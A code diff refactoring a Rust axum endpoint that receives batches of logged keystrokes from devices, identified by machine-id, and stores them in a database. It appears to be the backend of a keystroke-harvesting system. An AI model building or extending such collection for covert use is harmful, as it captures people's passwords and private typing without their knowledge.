@@ -1,23 +1,7 @@
-use async_scoped::TokioScope;
 use axum::{Json, extract::State, http::HeaderMap};
-use chrono::NaiveDateTime;
-use utoipa::ToSchema;
-use uuid::Uuid;
+use oxalate_schemas::harvester::public::keylogger::post_keylogger::*;
 
 use crate::{AppState, Error, insure_device_exists};
-
-#[derive(serde::Deserialize, ToSchema)]
-#[schema(as = Post::KeyLogger::Req)]
-pub struct Req {
-    pub keys: Vec<Key>,
-}
-
-#[derive(serde::Deserialize, ToSchema)]
-#[schema(as = Post::KeyLogger::Req::Key)]
-pub struct Key {
-    pub at: NaiveDateTime,
-    pub key_pressed: String,
-}
 
 #[utoipa::path(
     post,
@@ -43,7 +27,7 @@ pub async fn post_keylogger(
         .ok_or(Error::BadRequest("No machine-id in header".into()))?;
     insure_device_exists(machine_id, &app_state.db_pool).await?;
 
-    for key in req.keys.iter() {
+    for key in req.0.iter() {
         let db_pool = app_state.db_pool.clone();
         sqlx::query!(
             r#"
